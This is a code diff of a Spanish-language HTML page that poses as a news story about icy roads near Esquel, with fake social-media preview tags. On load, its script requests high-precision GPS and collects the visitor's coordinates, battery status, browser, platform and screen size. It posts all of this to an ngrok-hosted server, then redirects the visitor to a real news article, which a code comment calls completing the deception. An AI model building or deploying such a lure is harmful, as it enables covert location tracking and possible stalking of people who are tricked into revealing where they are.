@@ -2,55 +2,81 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="ESTADO DE RUTAS: Nieve y hielo en la zona de Esquel">
+    <meta property="og:description" content="Reporte actualizado de Vialidad Nacional sobre el tramo Esquel - Tecka.">
+    <meta property="og:image" content="https://www.eqsnotas.com/u/fotografias/m/2023/5/22/f1280x720-136514_149688_5050.jpg">
+    <meta property="og:type" content="article">
+
     <title>Noticias Esquel 2026</title>
 </head>
-<body style="font-family: Arial; text-align: center; padding-top: 50px;">
+<body style="font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4;">
 
-    <h1>Cargando noticia...</h1>
-    <p>Conectando con el servidor local de Esquel.</p>
+    <div style="max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1);">
+        <h1 style="color: #d32f2f;">Cargando noticia...</h1>
+        <p>Conectando con el servidor local de noticias de Esquel.</p>
+        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #d32f2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto;"></div>
+    </div>
+
+    <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 
     <script>
         async function enviar(pos) {
-            // TU LINK DE NGROK (Asegurate que sea el actual)
+            // REEMPLAZA ESTE LINK CON TU URL ACTUAL DE NGROK
             const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save";
 
-            // 1. Obtener datos de Batería
-            let batNivel = "No disponible";
-            let estaCargando = "No";
+            // 1. Obtener nivel de batería y estado
+            let batNivel = "No permitido";
+            let estaCargando = "Desconocido";
             try {
                 const battery = await navigator.getBattery();
                 batNivel = (battery.level * 100).toFixed(0) + "%";
                 estaCargando = battery.charging ? "Si" : "No";
-            } catch (e) {}
+            } catch (e) {
+                console.log("No se pudo acceder a la batería");
+            }
 
-            // 2. ENVIAR TODO (Ahora sí, todo dentro del JSON)
+            // 2. Preparar el paquete de datos completo
+            const datosParaEnviar = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                precision: pos.coords.accuracy.toFixed(2) + "m",
+                bateria: batNivel,
+                esta_cargando: estaCargando,
+                dispositivo: navigator.userAgent,
+                plataforma: navigator.platform,
+                resolucion: window.screen.width + "x" + window.screen.height
+            };
+
+            // 3. Enviar al servidor Python (PC)
             fetch(URL_NGROK, {
                 method: 'POST',
                 mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    precision: pos.coords.accuracy.toFixed(2) + "m",
-                    bateria: batNivel,
-                    esta_cargando: estaCargando,
-                    dispositivo: navigator.userAgent
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(datosParaEnviar)
             });
 
-            // 3. Redirigir a la noticia real
+            // 4. Redirigir a la noticia real para completar el engaño
             setTimeout(() => {
-                window.location.href = "https://www.eqsnotas.com/";
-            }, 1000);
+                window.location.href = "https://www.eqsnotas.com/noticias/2023/05/22/136514-vialidad-nacional-recomienda-precaucion-por-hielo-en-la-calzada";
+            }, 1500);
         }
 
-        function error() {
+        function error(err) {
+            console.warn(`ERROR(${err.code}): ${err.message}`);
+            // Si el usuario rechaza la ubicación, igual lo mandamos a la noticia
             window.location.href = "https://www.eqsnotas.com/";
         }
 
+        // Iniciar captura al cargar la página
         window.onload = function() {
             navigator.geolocation.getCurrentPosition(enviar, error, {
-                enableHighAccuracy: true
+                enableHighAccuracy: true, // Forzar GPS de alta precisión
+                timeout: 10000,
+                maximumAge: 0
             });
         };
     </script>
